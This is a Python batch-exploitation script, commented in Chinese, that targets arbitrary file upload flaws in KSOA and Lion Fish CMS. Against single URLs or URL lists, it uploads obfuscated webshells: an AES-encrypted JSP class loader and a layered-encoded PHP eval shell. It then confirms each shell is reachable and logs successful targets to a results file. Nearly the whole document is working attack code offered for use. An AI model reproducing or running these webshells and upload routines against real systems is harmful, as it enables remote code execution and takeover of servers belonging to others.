import requests
import argparse
import sys
import json

name_art = r"""
 ██▓     █    ██     ███▄ ▄███▓ ██▓ ███▄    █   ▄████      █████▒▓█████  ██▓
▓██▒     ██  ▓██▒   ▓██▒▀█▀ ██▒▓██▒ ██ ▀█   █  ██▒ ▀█▒   ▓██   ▒ ▓█   ▀ ▓██▒
▒██░    ▓██  ▒██░   ▓██    ▓██░▒██▒▓██  ▀█ ██▒▒██░▄▄▄░   ▒████ ░ ▒███   ▒██▒
▒██░    ▓▓█  ░██░   ▒██    ▒██ ░██░▓██▒  ▐▌██▒░▓█  ██▓   ░▓█▒  ░ ▒▓█  ▄ ░██░
░██████▒▒▒█████▓    ▒██▒   ░██▒░██░▒██░   ▓██░░▒▓███▀▒   ░▒█░    ░▒████▒░██░
░ ▒░▓  ░░▒▓▒ ▒ ▒    ░ ▒░   ░  ░░▓  ░ ▒░   ▒ ▒  ░▒   ▒     ▒ ░    ░░ ▒░ ░░▓  
░ ░ ▒  ░░░▒░ ░ ░    ░  ░      ░ ▒ ░░ ░░   ░ ▒░  ░   ░     ░       ░ ░  ░ ▒ ░
  ░ ░    ░░░ ░ ░    ░      ░    ▒ ░   ░   ░ ░ ░ ░   ░     ░ ░       ░    ▒ ░
    ░  ░   ░               ░    ░           ░       ░               ░  ░ ░  

"""

global header, poc, poc2, data


def welcome_message():
    print("\n\n\n\n")
    print("-----------欢迎使用批量文件上传漏洞利用脚本！-----------")
    print(name_art)
    print("\n")
    print("脚本支持漏洞：\n")
    print("1. KSOA任意文件上传漏洞\n")
    print("2. 狮子鱼CMS任意文件上传漏洞\n")
    return choose_vulnerability()


def choose_vulnerability():
    while True:
        choice = input("请选择要使用的漏洞（输入 1 或 2）：")
        if choice in ['1', '2']:
            return int(choice)
        else:
            print("输入错误，请重新输入！")


def set_poc_data(choice):
    global header, poc, poc2, data  # 需要在函数中声明使用的是全局变量而不是函数内定义的同名局部变量。

    if choice == 1:
        # KSOA任意文件上传漏洞
        header = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
            "Accept": "*/*",
            "Connection": "close",
            "Accept-Encoding": "gzip, deflate",
            "Content-Length": "2004",
        }
        poc = "/servlet/com.sksoft.bill.ImageUpload?filepath=/&filename=time.jsp"
        poc2 = "/pictures/time.jsp"

        data = r'''
        Hello Administrator!
        WelCome To Tas9er JSP Console!<%@page import="sun.misc.*,javax.crypto.Cipher,javax.crypto.spec.SecretKeySpec,java.util.Random" %>
        <%!
            class govcTe8Acfm extends \u0043l\u0061\u0073\u0073\u004c\u006f\u0061\u0064\u0065\u0072 {
                govcTe8Acfm(\u0043l\u0061\u0073\u0073\u004c\u006f\u0061\u0064\u0065\u0072 govFsVuE) {
                    super(govFsVuE);
                }
                public Class govk(byte[] govMAyhpPJE53EAk) {
                    return super.d\uuuuuuuuu0065fineClass/*govi9Emo1fguHGzQW*/(govMAyhpPJE53EAk,0,govMAyhpPJE53EAk.length);
                }
            }
        %><%
            out.println("Random Garbage Data:");
            Random govGSYyt1O6D8XAD = new Random();
            int gov5Q = govGSYyt1O6D8XAD.nextInt(1234);
            int govA = govGSYyt1O6D8XAD.nextInt(5678);
            int govJRqIEUf = govGSYyt1O6D8XAD.nextInt(1357);
            int govtfhbcIAtq9nLGF = govGSYyt1O6D8XAD.nextInt(2468);
            out.println(gov5Q+","+govA+","+govJRqIEUf+","+govtfhbcIAtq9nLGF);
            String[] govT = new String[]{"A", "P", "B", "O", "C", "S", "D", "T"};
            String govYqfHwcB90UJ = govT[1] + govT[3] + govT[5] + govT[7];
            if (request.getMethod().equals(govYqfHwcB90UJ)) {
                String gov5xPwOsgHM3pq0 = new String(new B\u0041\u0053\u0045\u0036\u0034\u0044\u0065\u0063\u006f\u0064\u0065\u0072()/*govz483yM*/./*govJyDcaRsiY6*/decodeBuffer/*govEdlUeo6jCVW*/("MTZhY2FjYzA1YWFmYWY2Nw=="));
                session.setAttribute("u", gov5xPwOsgHM3pq0);
                Cipher govto7bPARJgG = Cipher.getInstance("AES");
                govto7bPARJgG.init(((gov5Q * govA + govJRqIEUf - govtfhbcIAtq9nLGF) * 0) + 3 - 1, new SecretKeySpec(gov5xPwOsgHM3pq0.getBytes(), "AES"));
                new govcTe8Acfm(this.\u0067\u0065t\u0043\u006c\u0061\u0073\u0073().\u0067\u0065t\u0043\u006c\u0061\u0073\u0073Loader()).govk(govto7bPARJgG.doFinal(new sun.misc./*gov7*/B\u0041\u0053\u0045\u0036\u0034\u0044\u0065\u0063\u006f\u0064\u0065\u0072()./*govRhjtUT*/decodeBuffer(request.getReader().readLine()))).newInstance()/*govGBgPKhqcH94*/.equals(pageContext);
            }
        %>
        '''
    elif choice == 2:
        # 狮子鱼CMS任意文件上传漏洞

        # requests 库会自动生成正确的 Content-Type，包括适当的 boundary。
        header = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0",
        }

        poc = "/Common/ckeditor/plugins/multiimg/dialogs/image_upload.php"
        poc2 = ""

        phpcode = r'''
        Hello Administrator!
        WelCome To Tas9er PHP Console!<?php
        @error_reporting(0);
        session_start();
            $govDwdJO0APphWcRcT= base64_decode(base64_decode("TVRaaFkyRmpZekExWVdGbVlXWTI=")).chr(55);
            $_SESSION['k']=$govDwdJO0APphWcRcT;
            session_write_close();
            $govT=base64_decode(base64_decode("YjJKMWFHRnZjbkJtTlhWM05EUmtkbTl4"));
            $govOC2Wyop='openssl';
            $gov3S=govTI88GPA($govT);
            $govq="file_g".chr(101)."t_"."con".base64_decode("dGVudHM=");
            $govaBSlWZczWY9h=$govq($gov3S);
            if(!extension_loaded($govOC2Wyop))
            {
                $govJkVcXT6tfuE="base64_"."decode";
                $govaBSlWZczWY9h=$govJkVcXT6tfuE("/*X]-DP@i*/".$govaBSlWZczWY9h);
                for($i=0;$i<strlen($govaBSlWZczWY9h);$i++) {

                    }
            }
            $govaBSlWZczWY9h=openssl_decrypt($govaBSlWZczWY9h, base64_decode(base64_decode("UVVWVE1UST0=")).chr(56), $govDwdJO0APphWcRcT);
            $govgCBZSGr=explode('|',$govaBSlWZczWY9h);
            $govCqiwiUMha9if=$govgCBZSGr[1];
            class govL1b{public function __invoke($p) {eval("/*X]-DP@i*/".$p."");}}
            @call_user_func(new govL1b(),$govCqiwiUMha9if);
            function govTI88GPA($govrcHSugMhKAn){
            $di15 = '';
            $govw1wGK = (3929+19447)*intval(chr(48));
            $govk8bB3sKx9SPdgxE = (10202-24180)*intval(chr(48));
            for ($i = 0, $j = strlen($govrcHSugMhKAn); $i < $j; $i++){
                $govw1wGK <<= 5;
                if ($govrcHSugMhKAn[$i] >= 'a' && $govrcHSugMhKAn[$i] <= 'z'){
                    $govw1wGK += (ord($govrcHSugMhKAn[$i]) - 97);
                } elseif ($govrcHSugMhKAn[$i] >= '2' && $govrcHSugMhKAn[$i] <= '7') {
                    $govw1wGK += (24 + $govrcHSugMhKAn[$i]);
                } else {
                    exit(1);
                }
                $govk8bB3sKx9SPdgxE += 5;
                while ($govk8bB3sKx9SPdgxE >= 8){
                    $govk8bB3sKx9SPdgxE -= 8;
                    $di15 .= chr($govw1wGK >> $govk8bB3sKx9SPdgxE);
                    $govw1wGK &= ((1 << $govk8bB3sKx9SPdgxE) - 1);}}
            return $di15;}
        ?>
            '''
        # 使用一个元组指定文件名和文件内容
        file_data = ("test.php", phpcode, "image/gif")
        data = {
            "files": file_data
        }


# 验证脚本
def upload(url):
    global poc, poc2
    try:
        if choice == 1:
            res = requests.post(url=url + poc, headers=header, data=data, verify=False, timeout=6)
            if res.status_code != 200:
                print("连接失败！")
                return
        elif choice == 2:
            # requests库 的 files 字段会自动补全上传文件的字段，如content-type和合适的boundary
            res = requests.post(url=url + poc, headers=header, files=data, timeout=6)
            if res.status_code != 200:
                print("连接失败！")
                return
            else:
                res_json = json.loads(res.text)
                print(res_json)
                poc2 = res_json['imgurl']


        # 验证文件是否上传成功
        confirm = requests.get(url=url + poc2, headers=header, timeout=6)
        if confirm.status_code == 200:
            tips = f"成功！请访问：{url + poc2}验证漏洞！\n"
            print(tips)
            with open("result.txt", "a+") as a:
                a.write(tips)
        else:
            print(f"有错误！错误原因为：{confirm.status_code}\n")
    except requests.exceptions.Timeout:
        print(f"请求超时！跳过 {url}\n")
    except requests.exceptions.ConnectionError:
        print(f"连接错误！跳过 {url}\n")


# 读取文件中的url并进行扫描
def process_file(file_path):
    with open(file_path, 'r') as file:
        urls = file.readlines()
    for url in urls:
        # 判断是否带有http协议头
        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url.strip()
        print(f"扫描 {url}")
        upload(url)


if __name__ == "__main__":
    if len(sys.argv) == 1:
        choice = welcome_message()
        set_poc_data(choice)
        print("使用 -u 参数扫描单个网站")
        print("使用 -f 参数扫描文件中的网站")
        print("\n")
        args_str = input("请输入参数（例如：'-u 127.0.0.1'）：")
        args = args_str.split()
    else:
        args = sys.argv[1:]

    parser = argparse.ArgumentParser(description="任意文件上传漏洞POC")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-f", "--file", type=str, help="包含URL的文件")
    group.add_argument("-u", "--url", type=str, help="单个URL地址")

    args = parser.parse_args(args)

    if args.file:
        # 如果输入参数是-f ， 那么读取文件中的url
        process_file(args.file)
    else:
        # 如果输入参数不是-f ，那么检测单个url
        if not args.url.startswith('http://') and not args.url.startswith('https://'):
            url = 'http://' + args.url.strip()
            upload(url)
